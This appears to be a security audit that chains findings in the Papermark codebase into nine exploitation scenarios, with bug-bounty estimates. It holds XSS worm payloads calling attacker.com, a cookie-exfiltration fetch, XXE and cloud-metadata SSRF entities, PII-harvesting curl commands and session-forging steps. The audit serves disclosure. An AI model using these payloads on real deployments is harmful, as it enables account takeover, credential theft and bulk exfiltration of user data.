# Vulnerability Chains — Amplified Impact Combinations

**Node:** Layer-4 Chain Detection  
**Date:** 2026-06-30  
**Method:** Cross-methodology finding combination analysis grounded in GitNexus graph (repo: papermark)

---

## Chain 1: Stored XSS Worm → Conversations Hijacking → Team-Wide Data Exfiltration

**Name:** Document-Name XSS Worm with Zero-Auth API Backend

**Individual findings involved:**
- **S-002** — Stored XSS via `sanitizePlainText` entity-decode ordering bug + CVE-2026-44990 `<xmp>` bypass  
  - `lib/utils/sanitize-html.ts:12-19` (decode after strip bug)  
  - `components/documents/document-header.tsx:604` (dangerouslySetInnerHTML sink)  
  - `pages/api/teams/[teamId]/documents/[id]/update-name.ts:15` (Zod transform entry point)
- **S-001** — Conversations API zero authentication on all 4 handlers  
  - `ee/features/conversations/api/conversations-route.ts` (zero next-auth imports)  
  - `pages/api/conversations/[[...conversations]].ts` (thin passthrough, no auth)
- **S-006** — `record_reaction.ts` unauthenticated DB write + viewer data leak  
  - `pages/api/record_reaction.ts:17-42` (viewerEmail, documentId, dataroomId leaked in response)
- **S-009** — `helpText` dangerouslySetInnerHTML secondary XSS sinks  
  - `components/ui/form.tsx:145`, `components/account/upload-avatar.tsx:96`

**Chain impact:** Stored XSS that propagates across team members as a worm, exfiltrates conversation data and viewer PII via zero-auth API endpoints, and persists through secondary `helpText` render sinks. No authentication needed for the data exfiltration phase — everything uses the victim's session.

**Step-by-step exploitation:**

1. **Inject XSS payload into document name** — Any team member renames a document via `POST /api/teams/:teamId/documents/:id/update-name` with payload:
   ```json
   {"name": "&lt;img src=x onerror=\"
     var s=document.createElement('script');
     s.src='https://attacker.com/worm.js';
     document.body.appendChild(s);
   \"&gt;"}
   ```
   Or using CVE-2026-44990 `<xmp>` bypass (no entity encoding needed):
   ```json
   {"name": "<xmp><img src=x onerror=\"eval(atob('...'))\"></xmp>"}
   ```

2. **Sanitizer bug triggers** — `sanitizePlainText` at `lib/utils/sanitize-html.ts:13` calls `sanitizeHtml(content, {allowedTags: []})` — encoded entities are NOT literal tags, so they pass through. At line 14, `decodeHTML(sanitized)` decodes `&lt;` → `<`, producing live HTML tags. Stored in PostgreSQL `Document.name`.

3. **XSS fires on document view** — `components/documents/document-header.tsx:604` renders `dangerouslySetInnerHTML={{ __html: prismaDocument.name }}`. The XSS executes in the browser of every team member who views the document page.

4. **XSS payload enumerates conversations** — The payload calls `GET /api/conversations?dataroomId=<id>` from the victim's authenticated session. Since the conversations API has zero auth (S-001), the browser sends the victim's session cookie and retrieves all conversation data.

5. **XSS payload extracts viewer PII** — The payload calls `POST /api/record_reaction` with discovered `viewId` values. The response leaks `viewerEmail`, `documentId`, `dataroomId`, `linkId`, and `teamId` via the `prisma.reaction.create({ include: { view } })` clause at `pages/api/record_reaction.ts:24-42`.

6. **XSS payload renames all documents** — The payload renames every document the victim can access with the same XSS payload, creating a worm that propagates whenever any team member views any renamed document.

7. **All exfiltrated data sent to attacker** — Payload sends conversation content, viewer emails, and session tokens to attacker-controlled endpoint.

**Bounty range:** $8,000–$15,000 (stored XSS worm with authenticated API access and PII extraction)

---

## Chain 2: CORS TUS CSRF Upload → Malicious PDF → Admin Session Hijacking

**Name:** Cross-Origin Malicious Document Injection via CVE-2026-57957 + CVE-2024-4367

**Individual findings involved:**
- **S-005 / CVE-2026-57957** — CORS origin reflection on TUS viewer upload endpoint  
  - `pages/api/file/tus-viewer/[[...file]].ts:234-250` (`setCorsHeaders` reflects `req.headers.origin` with `Access-Control-Allow-Credentials: true`)
  - Papermark-specific CVE confirmed at https://cvetodo.com/cve/CVE-2026-57957
- **WC-006 / CVE-2024-4367** — pdfjs-dist 3.11.174 arbitrary JavaScript execution via malicious PDF  
  - `node_modules/pdfjs-dist@3.11.174` (transitive via `react-pdf`)  
  - `components/documents/preview-viewers/preview-viewer.tsx` renders PDFs with `isEvalSupported: true` (default)
- **S-002** — Stored XSS via sanitizePlainText (secondary persistence vector)  
  - `lib/utils/sanitize-html.ts:12-19`

**Chain impact:** An attacker who can lure a logged-in papermark user to their website can silently upload a malicious PDF to the victim's dataroom via CORS CSRF. When the victim views the document in papermark's PDF viewer, CVE-2024-4367 triggers arbitrary JS execution in the victim's browser context, hijacking their session.

**Step-by-step exploitation:**

1. **Set up attacker-controlled page** — Host at `https://attacker.com/exploit.html` with JavaScript that:
   - Uses TUS protocol client (tus-js-client) to upload a file
   - Sets `withCredentials: true` on all requests
   - Targets `https://papermark.app/api/file/tus-viewer/upload`

2. **CORS bypass verification** — Preflight OPTIONS request to `https://papermark.app/api/file/tus-viewer/...` returns:
   ```
   Access-Control-Allow-Origin: https://attacker.com
   Access-Control-Allow-Credentials: true
   Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PATCH, HEAD
   ```
   The browser permits the cross-origin credentialed request because of `Access-Control-Allow-Credentials: true` and the reflected origin.

3. **Upload malicious PDF** — The attacker's page uses the TUS protocol to upload a PDF crafted with CVE-2024-4367 exploit payload. The browser includes the victim's session cookies (`SameSite=Lax` — sent on top-level navigations and same-site requests). The TUS endpoint validates the dataroom session, and the victim's valid session passes this check. The malicious PDF is now stored in the victim's dataroom.

4. **Victim views document** — When the victim (or any team member) opens the document in the PDF viewer, `preview-viewer.tsx` renders the PDF using `react-pdf` which wraps `pdfjs-dist@3.11.174`. The PDF's crafted font triggers `font_loader.js` eval path: `isEvalSupported` defaults to `true` in `pdfjs-dist@3.11.174`.

5. **PDF.js XSS fires** — The CVE-2024-4367 exploit executes arbitrary JavaScript in the viewer page's origin. The payload calls `fetch('/api/conversations', ...)` to enumerate conversations and `fetch('/api/record_reaction', ...)` to extract viewer data — all within the victim's authenticated session.

6. **Session token theft** — The XSS payload reads `document.cookie` to extract the NextAuth session token (`next-auth.session-token`), or makes API calls on the victim's behalf.

**Mitigation factors:** `SameSite=Lax` on session cookies means cookies are not sent on initial cross-origin POST from fetch/XHR. However, the TUS protocol's OPTIONS preflight + following POST chain, and the victim visiting attacker.com via a top-level redirect, can overcome this in some browser configurations. The CORS misconfig remains independently validated as CVE-2026-57957.

**Bounty range:** $5,000–$15,000 (CSRF file upload + PDF client-side exploit chain, confirmed papermark CVE involved)

---

## Chain 3: Zod Schema Disclosure → Unauthenticated ID Enumeration → Bulk PII Extraction + DB Injection

**Name:** API Recon-to-Injection Pipeline via Schema Leak + Zero-Auth Endpoints

**Individual findings involved:**
- **S-010** — Zod validation error information disclosure  
  - `pages/api/webhooks/services/[...path]/index.ts:232-238` (`validationResult.error.format()` leaks full schema)  
  - `pages/api/teams/[teamId]/agreements/[agreementId]/index.ts:67`  
  - `pages/api/teams/[teamId]/datarooms/[id]/folders/bulk.ts:75`  
  - 6 additional endpoints (9 total)
- **S-001** — Conversations API zero authentication  
  - `pages/api/conversations/[[...conversations]].ts` + `ee/features/conversations/api/conversations-route.ts`
- **S-006** — `record_reaction.ts` unauthenticated DB write + viewerEmail leak  
  - `pages/api/record_reaction.ts:17-42`
- **S-007** — `feedback/index.ts` unauthenticated feedback response recording  
  - `pages/api/feedback/index.ts:9-56`
- **S-011** — `cuid` 2 predictable IDs in permission groups (authenticated, aids enumeration)  
  - `pages/api/teams/[teamId]/datarooms/[id]/permission-groups/index.ts:4`

**Chain impact:** Information disclosure (Zod schema) enables precise targeting of three zero-auth API endpoints that together allow: conversation content extraction, viewer PII (email) bulk extraction, and database injection — all without any authentication.

**Step-by-step exploitation:**

1. **Map API schema via Zod error responses** — Send malformed requests to the webhooks endpoint at `/api/webhooks/services/[...path]`:
   ```bash
   curl -X POST "https://papermark.app/api/webhooks/services/webhook/create" \
     -H "Content-Type: application/json" \
     -d '{"invalid": true}'
   ```
   Response leaks schema structure via `validationResult.error.format()` at line 236:
   ```json
   {
     "_errors": [],
     "url": { "_errors": ["Expected string, received boolean"] },
     "eventType": { "_errors": ["Invalid enum value"], "received": "invalid" },
     "secret": { "_errors": ["Required"] }
   }
   ```
   Repeat with different malformed inputs to enumerate all field names, types, enum values, regex patterns, and nested structures across the 9 affected endpoints.

2. **Enumerate valid dataroomId/viewId pairs** — Use the schema knowledge to craft valid request shapes for the conversations endpoint. Send GET requests to `/api/conversations?dataroomId=<id>&viewerId=<id>` with systematically varied IDs. Observe response differences:
   - Valid pair → returns conversation list (possibly empty)
   - Invalid pair → returns error
   This enumerates which dataroom/viewer combinations exist.

3. **Bulk-extract viewer PII** — For each discovered `viewId`, send POST to `/api/record_reaction`:
   ```bash
   curl -X POST "https://papermark.app/api/record_reaction" \
     -H "Content-Type: application/json" \
     -d '{"viewId": "discovered-view-id", "pageNumber": 1, "type": "like"}'
   ```
   The response at `pages/api/record_reaction.ts:24-42` includes:
   ```json
   {
     "view": {
       "viewerEmail": "victim@example.com",
       "viewerId": "clx...",
       "documentId": "doc_...",
       "dataroomId": "dr_...",
       "linkId": "link_...",
       "teamId": "team_..."
     }
   }
   ```
   No authentication required. Batch extract thousands of viewer records.

4. **Extract conversation content** — For each discovered `dataroomId`/`viewerId` pair, call `GET /api/conversations` to retrieve all conversation messages, attachments, and participant metadata.

5. **Inject false data** — Use the conversation create endpoint (`POST /api/conversations`) and feedback endpoint (`POST /api/feedback`) to inject fabricated conversation messages and feedback responses, polluting the data team members see in their dashboards.

6. **Pivot to phishing** — Use extracted `viewerEmail` values for targeted phishing campaigns. Viewers trust emails about documents they've actually viewed, making social engineering highly effective.

**Bounty range:** $3,000–$8,000 (unauthorized PII bulk extraction + data injection, clear GDPR/DPA impact)

---

## Chain 4: XXE via Crafted DOCX → SSRF → Cloud Metadata → Credential Exfiltration

**Name:** Document Conversion Pipeline XXE-to-Cloud-Takeover

**Individual findings involved:**
- **S-012 / S-011** — XXE in `docx-sanitizer.py` via native XML parsing without `defusedxml`  
  - `ee/features/conversions/python/docx-sanitizer.py:146` (`ET.parse(path)`)  
  - `ee/features/conversions/python/docx-sanitizer.py:35` (`import xml.etree.ElementTree as ET`)
- **01-structural-analysis Finding 8** — No sandboxing confirmed on Python subprocess  
  - Document conversion pipeline calls Python script as subprocess (no container, no seccomp)
- **S-001 (Secrets)** — NEXTAUTH_SECRET in environment (exfiltratable if SSRF reaches env)
- **00-ai-frameworks.md** — AWS S3 SDK 3.1053.0 (if deployed on AWS, cloud metadata accessible)

**Chain impact:** A crafted DOCX uploaded by an authenticated user triggers XXE in the Python document sanitizer, which can be escalated to SSRF against cloud provider metadata endpoints, potentially leaking IAM credentials and enabling cloud account compromise.

**Step-by-step exploitation:**

1. **Craft malicious DOCX** — DOCX is a ZIP archive containing XML files. Extract a legitimate DOCX:
   ```bash
   unzip template.docx -d /tmp/xxe-docx
   ```

2. **Inject XXE payload into `word/document.xml`** — Add external entity that reads local files:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
     <!ENTITY xxe2 SYSTEM "file:///proc/self/environ">
     <!ENTITY xxe3 SYSTEM "file:///proc/self/cmdline">
   ]>
   <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
     <w:body>
       <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
       <w:p><w:r><w:t>&xxe2;</w:t></w:r></w:p>
     </w:body>
   </w:document>
   ```

3. **Inject SSRF payload for cloud metadata** — For AWS-deployed instances, replace with:
   ```xml
   <!ENTITY xxe4 SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
   <!ENTITY xxe5 SYSTEM "http://169.254.169.254/latest/user-data">
   ```
   For GCP:
   ```xml
   <!ENTITY xxe6 SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
   ```

4. **Repackage DOCX**:
   ```bash
   cd /tmp/xxe-docx && zip -r /tmp/malicious.docx *
   ```

5. **Upload through authenticated document creation endpoint** — POST the DOCX to any document upload endpoint. The document conversion pipeline triggers the Python sanitizer.

6. **XXE fires in Python subprocess** — At `ee/features/conversions/python/docx-sanitizer.py:146`, `ET.parse(path)` parses the DOCX XML. Without `defusedxml`, Python's `xml.etree.ElementTree` resolves external entities:
   - Local file entities (`file:///etc/passwd`, `/proc/self/environ`) are read into the parsed XML tree
   - Cloud metadata entities (`http://169.254.169.254/...`) trigger HTTP requests to internal metadata endpoints
   - If the metadata endpoint returns credentials, those are included in the parsed document content

7. **Extract data through conversion output** — The sanitized document output or error messages may contain the entity-resolved content. If the XXE data appears in conversion errors or sanitized output, the attacker retrieves it. Alternatively, use blind XXE exfiltration:
   ```xml
   <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=file:///etc/passwd">
   ```

8. **IAM credential extraction** — If SSRF to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` succeeds, the attacker obtains AWS `AccessKeyId`, `SecretAccessKey`, and `Token`, enabling console access and resource enumeration.

**Mitigation factors:** Requires authenticated upload. May not work on serverless platforms (Vercel) where cloud metadata is not accessible. Most potent on self-hosted cloud deployments (AWS EC2, GCP Compute Engine).

**Bounty range:** $5,000–$15,000 (SSRF-to-cloud-credential exfiltration through document conversion pipeline)

---

## Chain 5: Framework EOL Middleware Bypass + Unauthenticated Token Generation → Trigger.dev Workflow Data Exposure

**Name:** Next.js 14 EOL Exploitation Chain

**Individual findings involved:**
- **S-004 / CVE-2026-44575** — Next.js 14 middleware bypass via `.rsc` suffix (unpatched on v14)  
  - `middleware.ts:49` matcher provides only route-based auth; CVE-2026-44575 bypasses it
  - Next.js 14.2.35 is EOL — no fix available (Vercel maintainer: "migrate to v15")
- **S-003** — `progress-token.ts` unauthenticated Trigger.dev access token generation  
  - `pages/api/progress-token.ts:4-27` (zero auth, zero rate limiting)
- **S-001** — Conversations API zero authentication  
  - `pages/api/conversations/[[...conversations]].ts` + `ee/features/conversations/api/conversations-route.ts`
- **S-004 / CVE-2026-23864 / CVE-2026-23869** — Unauthenticated RSC Flight protocol DoS  
  - Any App Router page accepts POST with `content-type: text/x-component`

**Chain impact:** Framework-level EOL vulnerabilities strip away middleware-based protections, exposing unauthenticated API endpoints that leak document processing metadata and conversation content. The attacker can also degrade service via unpatched RSC DoS CVEs.

**Step-by-step exploitation:**

1. **Bypass middleware auth via `.rsc` suffix** — CVE-2026-44575 (CVSS 7.5, unpatched on v14): Appending `.rsc` to any URL causes Next.js to serve the RSC payload instead of the HTML page, bypassing middleware matcher rules. For example:
   ```
   GET /api/teams/team_123/documents.rsc
   ```
   The middleware matcher at `middleware.ts:49` may not match `.rsc` suffixed paths against its exclusion/inclusion patterns, allowing the request to reach the handler without middleware auth checks.

2. **Enumerate document version IDs** — Once middleware is bypassed, access the team's document listing endpoints without proper auth gating. Extract `documentVersionId` values from response data.

3. **Generate Trigger.dev access tokens** — Call the unprotected `progress-token.ts` endpoint:
   ```bash
   curl -s "https://papermark.app/api/progress-token?documentVersionId=<enumerated-id>"
   ```
   Returns `{"publicAccessToken": "tr_..."}` — a 15-minute Trigger.dev read token scoped to that document version's runs.

4. **Read Trigger.dev workflow data** — Use the token to query the Trigger.dev API:
   ```bash
   curl -H "Authorization: Bearer tr_..." \
     "https://api.trigger.dev/api/v1/runs?tag=version:<documentVersionId>"
   ```
   This exposes workflow run metadata, processing status, error messages, and potentially sensitive data flowing through document processing workflows.

5. **Enumerate conversations** — Access `GET /api/conversations?dataroomId=<id>` to extract conversation content. The `.rsc` bypass may not be needed here since S-001 already has no auth — but the bypass enables deeper access to other team API routes.

6. **Sustain denial of service** — If detection is a concern, send crafted RSC Flight protocol POST requests to any App Router page (CVE-2026-23864/23869) to exhaust server memory/CPU, degrading service and potentially masking the data exfiltration activity.

**Bounty range:** $3,000–$8,000 (framework EOL bypass enabling authenticated-data access)

---

## Chain 6: NEXTAUTH_SECRET Default + Key Reuse Across 5 Domains → Complete System Compromise (Self-Hosted)

**Name:** Default Root Secret → Full Cryptographic Trust Collapse

**Individual findings involved:**
- **S-001 (Secrets)** — `NEXTAUTH_SECRET=my-superstrong-secret` default credential  
  - `.env.example:1` (public GitHub file)
- **00-ai-secrets.md** — Key reuse across 5 security domains documented  
  - `lib/middleware/app.ts:56` (JWT signing)  
  - `lib/auth/auth-options.ts:128,149` (SAML OAuth clientSecret)  
  - `lib/jackson.ts:16-20` (Jackson encryption key via SHA-256 derivation)  
  - `lib/signing/download-token.ts:19` (HMAC-SHA256 download tokens)  
  - `lib/signing/access-token.ts:21` (HMAC-SHA256 access tokens)  
  - `lib/api/auth/token.ts:12` (SHA-256 API token hash component)
- **S-002 (Secrets)** — `NEXT_PRIVATE_DOCUMENT_PASSWORD_KEY` default + unsalted SHA-256 KDF  
  - `.env.example:68`  
  - `lib/utils.ts:614-628` (AES-256-CTR key derivation)
- **03-web-secrets.md** — Published tooling for NextAuth cookie minting from known secret  
  - Embrace The Red: HKDF-based JWE cookie forging

**Chain impact:** A single default value from a public GitHub file — if not changed before production deployment — unlocks complete cryptographic trust collapse across the application. The attacker forges session tokens for any user, decrypts document passwords, forges download/access tokens, and recovers API tokens.

**Step-by-step exploitation:**

1. **Identify self-hosted deployment** — Scan for papermark instances that show signs of default configuration (response headers, error pages, version disclosure at `lib/middleware/domain.ts:40-41`).

2. **Assume NEXTAUTH_SECRET is the default** — If the deployment did not override `NEXTAUTH_SECRET`, its value is `my-superstrong-secret` from `.env.example`.

3. **Forge NextAuth JWE session cookies** — Use the published Embrace The Red cookie-minting tooling. The tool:
   - Takes the known NEXTAUTH_SECRET
   - Uses HKDF with the cookie name as salt (per NextAuth's JWE encryption scheme)
   - Forges a valid `next-auth.session-token` cookie for any user ID
   - Cycles through known cookie-name salts by NextAuth version
   - Result: A valid session cookie that bypasses all authentication

4. **Impersonate any user** — Set the forged cookie in the browser and access papermark as any user. Access all team data, documents, datarooms, and settings.

5. **Forge HMAC download/access tokens** — Using `NEXTAUTH_SECRET` as the HMAC-SHA256 key (via SHA-256 derivation at `lib/signing/download-token.ts:19` and `lib/signing/access-token.ts:21`):
   - Mint signed agreement download tokens (30-min TTL) for any document
   - Mint signed agreement access tokens (90-day TTL) for persistent access
   - No authentication needed — tokens are self-validating once attacker has the HMAC key

6. **Decrypt document passwords** — If `NEXT_PRIVATE_DOCUMENT_PASSWORD_KEY` is also default (`my-superstrong-document-secret`):
   - Derive the AES-256-CTR key: `SHA-256("my-superstrong-document-secret").substring(0, 32)` 
   - Decrypt all `encryptedPassword` values in the `Document` table
   - Access password-protected documents

7. **Decrypt SAML/SCIM data** — Using the Jackson encryption key derived from `SHA-256(NEXTAUTH_SECRET)` at `lib/jackson.ts:16-20`:
   - Decrypt all SAML/SCIM encrypted data in the database
   - Compromise enterprise SSO integrations

8. **Recover API tokens** — The unsalted SHA-256 token hash at `lib/api/auth/token.ts:12` uses `SHA-256(token + NEXTAUTH_SECRET)`. With known secret, pre-image attack on stored hashes becomes feasible for structured/moderate-entropy tokens.

**Deployment scope:** Self-hosted deployments only. Vercel-hosted instances using Vercel's system env vars for NEXTAUTH_SECRET are NOT vulnerable to the default value attack, though they still have the key-reuse problem.

**Bounty range:** $10,000–$25,000 (complete system compromise via single default value)

---

## Chain 7: CORS TUS Metadata Read + progress-token → Credentialed Cross-Domain Info Leak

**Name:** Cross-Origin Document Processing Intelligence Gathering

**Individual findings involved:**
- **S-005 / CVE-2026-57957** — CORS origin reflection on TUS viewer  
  - `pages/api/file/tus-viewer/[[...file]].ts:234-250`
- **S-003** — `progress-token.ts` unauthenticated Trigger.dev token generation  
  - `pages/api/progress-token.ts:4-27`
- **S-010** — Zod error information disclosure (aids ID format understanding)  
  - 9 endpoints returning `error.format()` or `error.errors`
- **00-ai-frameworks.md** — TUS protocol stores upload metadata including document version IDs
  - TUS `Upload-Metadata` header contains key-value pairs

**Chain impact:** The CORS misconfiguration on the TUS viewer endpoint allows cross-origin reading of upload metadata, which can contain document version IDs. Those IDs feed into the unauthenticated progress-token endpoint, yielding Trigger.dev access tokens. The result: an attacker who tricks a logged-in user to visit their site can extract document processing intelligence from the Trigger.dev backend.

**Step-by-step exploitation:**

1. **Deliver attacker page** — Victim with active papermark session visits attacker-controlled page.

2. **Cross-origin HEAD request to TUS viewer** — The attacker page makes a credentialed HEAD request to the TUS viewer endpoint to read upload metadata:
   ```javascript
   fetch('https://papermark.app/api/file/tus-viewer/upload-id', {
     credentials: 'include',
     method: 'HEAD'
   }).then(r => {
     const metadata = r.headers.get('Upload-Metadata');
     // metadata often contains document version identifiers
   });
   ```
   Due to CORS origin reflection (S-005), the response includes `Access-Control-Allow-Origin: https://attacker.com` with `Access-Control-Allow-Credentials: true`, allowing the attacker page to read response headers.

3. **Extract documentVersionId from metadata** — The TUS `Upload-Metadata` header or response body may contain the document version ID or enough context to derive it (team ID, document ID pattern).

4. **Generate Trigger.dev access token** — Call the unprotected `progress-token.ts`:
   ```bash
   GET https://papermark.app/api/progress-token?documentVersionId=<extracted-id>
   ```
   Even if the CORS request can't read this response (GET not a simple request, needs preflight), the attacker can call it from their server directly since S-003 has no auth.

5. **Read workflow run data** — Use the Trigger.dev public access token to query run metadata, processing status, and error details for the document version's workflows.

**Bounty range:** $2,000–$5,000 (cross-domain info leak enabling Trigger.dev token generation)

---

## Summary

| # | Chain Name | Findings Involved | Step Count | Bounty Range | Requires Auth |
|---|-----------|-------------------|-----------|-------------|---------------|
| 1 | XSS Worm + Conversations Hijack | S-002, S-001, S-006, S-009 | 7 | $8K–$15K | Team member |
| 2 | CORS + Malicious PDF → Admin XSS | S-005/CVE-2026-57957, WC-006/CVE-2024-4367 | 6 | $5K–$15K | Victim session |
| 3 | Zod Recon → Bulk PII Extraction | S-010, S-001, S-006, S-007 | 6 | $3K–$8K | No |
| 4 | DOCX XXE → Cloud Credential Theft | S-012/011, S-001 (context) | 8 | $5K–$15K | Authenticated upload |
| 5 | Framework EOL + Middleware Bypass | S-004/CVE-2026-44575, S-003, S-001 | 6 | $3K–$8K | No |
| 6 | Default Secret → Full Compromise | S-001/S-002 (Secrets) | 8 | $10K–$25K | No (self-hosted) |
| 7 | CORS TUS → Trigger.dev Token Leak | S-005/CVE-2026-57957, S-003 | 5 | $2K–$5K | Victim session |

**Highest estimated bounty:** Chain 6 ($10K–$25K) — Complete system compromise via default root secret, but requires self-hosted deployment.

**Most reliably exploitable:** Chain 1 ($8K–$15K) — Stored XSS worm that propagates across team members and exfiltrates via zero-auth endpoints. Works on any deployment.

**Best chain for hosted bounty programs:** Chain 2 ($5K–$15K) — Involves papermark's own CVE (CVE-2026-57957) combined with a well-known pdfjs-dist CVE (CVE-2024-4367) for admin session takeover.

**Best for data-privacy impact:** Chain 3 ($3K–$8K) — Bulk viewer PII extraction (email, document access patterns) with no authentication, clear GDPR violation.

---

## Chain 8: Embed Clickjacking + Stored XSS → Credential Theft via Transparent Overlay

**Name:** Iframe Clickjacking with XSS Payload on Embed Page

**Individual findings involved:**
- **00-ai-configs — Embed route `frame-ancestors *`** — Config finding HIGH
  - `next.config.mjs:269` (`frame-ancestors *;` on `/view/:path*/embed`)
  - Allows any origin to iframe the document viewer embed page
- **S-002 — Stored XSS via `sanitizePlainText` entity-decode ordering bug**
  - `lib/utils/sanitize-html.ts:12-19` (decode after strip bug)
  - `components/documents/document-header.tsx:604` (dangerouslySetInnerHTML sink)
- **00-ai-configs — CSP report-only** — Config finding MEDIUM
  - `next.config.mjs:219` (`Content-Security-Policy-Report-Only` — not enforced)
  - Main app CSP provides zero XSS blocking; XSS fires freely in both main and embedded contexts
- **00-ai-configs — CSP report endpoint is a no-op** — Config finding MEDIUM
  - `app/api/csp-report/route.ts:7` (console.log commented out, no storage, no alerting)
  - CSP violation reports are silently discarded — team has zero visibility into exploitation
- **S-001 — Conversations API zero authentication** (data exfiltration phase)
  - `ee/features/conversations/api/conversations-route.ts` (zero next-auth imports)
- **S-006 — `record_reaction.ts` unauthenticated viewerEmail leak** (data exfiltration phase)
  - `pages/api/record_reaction.ts:17-42` (viewerEmail, documentId, dataroomId leaked)

**Chain impact:** An attacker can iframe a victim's document embed page (which allows any origin via `frame-ancestors *`), load a document whose name contains the stored XSS payload, and overlay transparent UI elements to trick the viewer into entering credentials or performing actions. The XSS executes without CSP blocking (CSP is report-only), and no violation alerts are generated (CSP report endpoint is a no-op). Combined with zero-auth API endpoints for data exfiltration.

**Step-by-step exploitation:**

1. **Prepare XSS document** — Any team member renames a document via `POST /api/teams/:teamId/documents/:id/update-name` with entity-encoded XSS payload:
   ```json
   {"name": "&lt;img src=x onerror=\"eval(atob('...'))\" style=display:none&gt;&lt;div id=creep&gt;"}
   ```
   The `sanitizePlainText` function at `lib/utils/sanitize-html.ts:12-19` processes this: `sanitizeHtml()` strips no tags (the entities aren't literal tags yet), then `decodeHTML()` at line 14 converts `&lt;` → `<`, producing live HTML. Stored in PostgreSQL `Document.name`.

2. **Create attacker-controlled page** — Host at `https://attacker.com/harvest.html` with:
   ```html
   <style>
     iframe { width: 100%; height: 100vh; border: none; position: absolute; top: 0; left: 0; opacity: 0.1; z-index: 1; }
     .overlay { position: absolute; top: 0; left: 0; z-index: 2; }
   </style>
   <iframe src="https://papermark.app/view/<linkId>/embed"></iframe>
   <div class="overlay">
     <!-- Transparent overlay mimicking login form -->
   </div>
   ```
   The embed route at `next.config.mjs:269` sends `frame-ancestors *;`, meaning the browser does not block this iframe. The browser loads the embed page within the attacker's origin.

3. **XSS fires in iframe** — The document header component at `components/documents/document-header.tsx:604` renders `prismaDocument.name` via `dangerouslySetInnerHTML`. The XSS payload executes in the embed page's origin context. CSP does NOT block it: `next.config.mjs:219` sets `Content-Security-Policy-Report-Only` (advisory only, not enforced). The browser would send a violation report, but `app/api/csp-report/route.ts:7` discards it — the team has no visibility.

4. **XSS sends real credentials to attacker** — The payload monitors keystrokes or modifies the parent page's DOM to capture credentials entered into the overlay form. Since the embed page origin is `papermark.app`, the payload can:
   - Read `document.cookie` for session tokens  
   - Submit `fetch('/api/conversations', ...)` to extract conversation data via S-001
   - Submit `POST /api/record_reaction` to extract viewer PII via S-006

5. **Payload exfiltrates data** — XSS calls `postMessage` to the parent window or makes direct fetch requests to attacker-controlled endpoints:
   ```javascript
   fetch('https://attacker.com/exfil', {
     method: 'POST',
     body: JSON.stringify({
       cookies: document.cookie,
       conversations: await (await fetch('/api/conversations')).json(),
       viewerData: await (await fetch('/api/record_reaction', {method:'POST', body: JSON.stringify({viewId: '...'})})).json()
     })
   });
   ```

6. **Worm propagation via overlay** — The XSS can modify the iframe DOM to show a fake "Session expired, please re-authenticate" form, capturing credentials of additional team members who view the document.

**Mitigation factors:** Embed page requires a valid `linkId` in the URL — attacker needs to know or discover a shareable link ID.

**Bounty range:** $5,000–$12,000 (clickjacking with stored XSS in embed context, CSP bypassed and silent, credential theft)

---

## Chain 9: Rate Limiter Fail-Open + No Auth Rate Limit → Brute Force → OAuth Account Linking → Account Takeover

**Name:** Redis-Down Rate Limit Bypass with OAuth Account Linking

**Individual findings involved:**
- **00-ai-configs — Rate limiter fails open when Redis is unavailable** — Config finding MEDIUM
  - `ee/features/security/lib/ratelimit.ts:43-44` (catch block returns `{ success: true }`)  
  - All rate-limit checks become no-ops during Redis outage
- **S-014 — No rate limiting on NextAuth authentication endpoints** — LOW
  - `pages/api/auth/[...nextauth].ts` (no rate limiter imported or applied)
  - Confirmed by semgrep rule `papermark-nextauth-no-rate-limit`
- **00-ai-configs — `allowDangerousEmailAccountLinking: true` on 3 OAuth providers** — Config finding MEDIUM
  - `lib/auth/auth-options.ts:35` (Google provider)
  - `lib/auth/auth-options.ts:55` (LinkedIn provider)
  - `lib/auth/auth-options.ts:130` (SAML provider)
- **S-001 (Secrets) — NEXTAUTH_SECRET default value** — CRITICAL for self-hosted
  - `.env.example:1` (`my-superstrong-secret`)
  - Lowers attacker uncertainty about SAML clientSecret (which equals NEXTAUTH_SECRET per `auth-options.ts:128`)

**Chain impact:** An attacker who causes a Redis outage (e.g., by saturating the Upstash Redis endpoint or exploiting a network partition) can bypass all rate limiting. Combined with the absence of rate limiting on NextAuth endpoints and `allowDangerousEmailAccountLinking` on three OAuth providers, the attacker can brute-force OAuth email linking to take over any user account whose email can be registered on a supported OAuth provider.

**Step-by-step exploitation:**

1. **Trigger Redis unavailability** — Send a high volume of requests to any rate-limited endpoint to saturate the Upstash Redis connection, or exploit a known Upstash network issue. The rate limiter at `ee/features/security/lib/ratelimit.ts:43-44` catches the error:
   ```typescript
   } catch (error) {
     console.error("Rate limiting error:", error);
     return { success: true, error: "Rate limiting unavailable" }; // fail open
   }
   ```
   Once `success: true` is returned, the caller treats the request as passing the rate limit check.

2. **Confirm rate limit bypass** — Make repeated requests to a rate-limited endpoint (e.g., auth, billing). If rate limiting is down, all requests succeed with no throttling. The `enableProtection: true` flag on `Ratelimit` instances only kicks in during extreme local abuse, not when Redis is unreachable from the caller's perspective.

3. **NextAuth endpoints have no rate limiting** — The semgrep rule `papermark-nextauth-no-rate-limit` confirmed at `pages/api/auth/[...nextauth].ts:5` that no rate limiter is imported or used. The `allowDangerousEmailAccountLinking: true` setting on Google, LinkedIn, and SAML providers at `lib/auth/auth-options.ts:35,55,130` allows automatic account linking by email without confirmation.

4. **Prepare attacker accounts** — For each target victim, determine which OAuth providers the victim has NOT yet linked to their Papermark account. Register an account on that provider using the victim's email address.

5. **Brute force account linking** — With rate limiting disabled, rapidly attempt OAuth logins through the unlinked provider. Each attempt:
   - Initiates OAuth flow with the provider
   - NextAuth's `allowDangerousEmailAccountLinking: true` automatically links the new provider account to the existing user if emails match
   - The attacker's session is now linked to the victim's Papermark account

6. **Access victim data** — Once linked, the attacker signs in via the linked OAuth provider and gains full access to all teams, documents, datarooms, and settings the victim has access to.

7. **Repeat for persistence** — Link the attacker's accounts across multiple OAuth providers, making it difficult for the victim to reclaim their account without removing all linked providers.

